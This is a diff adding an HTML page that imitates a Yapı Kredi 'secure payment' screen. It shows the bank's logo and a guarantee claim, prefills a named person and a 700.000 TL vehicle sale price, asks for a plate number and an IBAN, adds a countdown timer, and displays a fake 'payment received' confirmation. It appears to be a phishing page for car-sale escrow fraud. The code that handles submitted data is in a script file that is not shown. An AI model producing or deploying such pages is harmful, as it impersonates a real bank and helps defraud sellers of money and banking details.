@@ -1,0 +1,50 @@
+
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yapı Kredi Güvenli Ödeme</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+</head>
+<body>
+    <div class="background"></div>
+    <header>
+        <img src="images/logo.jpeg" alt="Yapı Kredi Logo" class="logo">
+    </header>
+    <main>
+        <div class="payment-box">
+            <h1>Güvenli Ödeme</h1>
+            <p>Bu işlem Yapı Kredi güvencesi altındadır.</p>
+            <div id="timer">09:59</div>
+            <form id="paymentForm">
+                <label>Ad Soyad</label>
+                <input type="text" value="Mevlüt Keser" readonly>
+                
+                <label>Araç Plakası</label>
+                <input type="text" placeholder="34 ABC 123" required>
+                
+                <label>IBAN</label>
+                <input type="text" placeholder="TR00 0000 0000 0000 0000 0000 00" required>
+                
+                <label>Satış Bedeli (TL)</label>
+                <input type="text" value="700.000" readonly>
+                
+                <button type="submit">Onayla</button>
+            </form>
+        </div>
+    </main>
+
+    <div id="confirmationModal" class="modal">
+        <div class="modal-content">
+            <h2>İşlem Başarılı</h2>
+            <p>Ödemeniz başarıyla alınmıştır.</p>
+            <div id="qrcode"></div>
+            <button onclick="closeModal()">Kapat</button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
